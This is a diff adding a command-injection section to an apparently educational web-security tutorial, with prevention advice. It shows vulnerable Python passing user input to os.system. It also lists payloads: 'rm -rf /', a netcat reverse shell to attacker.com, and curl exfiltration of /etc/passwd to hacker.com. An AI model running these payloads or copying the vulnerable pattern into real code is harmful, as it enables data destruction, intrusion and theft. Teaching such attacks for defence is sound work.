@@ -289,7 +289,59 @@ for char in chars:
 
 ##### **Key Takeaway**
 
-Blind SQLi turns _silent clues_ into full-scale breaches. Even without direct feedback, attackers can steal data one character—or one second—at a time.
+> Blind SQLi turns _silent clues_ into full-scale breaches. Even without direct feedback, attackers can steal data one character—or one second—at a time.
+
+
+#### Command Injection Attack
+Command injection is a critical vulnerability where attackers **hijack an app’s OS-level commands** to manipulate servers, steal data, or even take full system control.
+##### How It Happens
+
+Apps that execute OS commands (e.g., file operations, system checks) without proper safeguards can turn user inputs into **backdoors**.
+###### Scenario
+A weather app lets users check server status by entering an IP address :
+
+```Python
+# Vulnerable Python Code  
+import os  
+user_input = request.GET.get('ip')  
+os.system(f"ping {user_input}")  # 🚨 Danger!  
+```
+
+An attacker injects :
+
+```Bash
+8.8.8.8; rm -rf /  # Deletes all files if app runs as root!  
+```
+
+The server executes : 
+
+```Bash
+ping 8.8.8.8; rm -rf /  
+```
+
+##### Why It’s Dangerous
+
+- **Full System Access**: Commands run with the app’s privileges (often root/admin).
+- **Data Theft**: Exfiltrate files, databases, or secrets.
+- **Persistence**: Install backdoors, crypto miners or ransomware.
+
+##### Real-World Attack Types
+
+| Attack Type           | Payload Example                     | Impact                         |                      |
+| --------------------- | ----------------------------------- | ------------------------------ | -------------------- |
+| **File Deletion**     | `; rm -rf /var/www`                 | Wipes critical data.           |                      |
+| **Reverse Shell**     | `; nc -e /bin/sh attacker.com 4444` | Grants remote terminal access. |                      |
+| **Data Exfiltration** | `; cat /etc/passwd                  | curl -X POST hacker.com`       | Steals system files. |
+##### How to Prevent
+
+1. **Avoid OS Commands** : Use built-in libraries (e.g., Python’s `subprocess` with `shell=False`).
+2. **Input Validation**  : re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',  ip) # Only check IPv4
+3. **Least Privilege** : Run apps with limited OS permissions.
+4. **Sandboxing** : Isolate risky processes in containers/virtual machines.
+
+##### **Key Takeaway**
+
+> "Command injection turns user inputs into a Trojan horse. Validate strictly, sanitize ruthlessly, and never trust raw input."
 
 
 
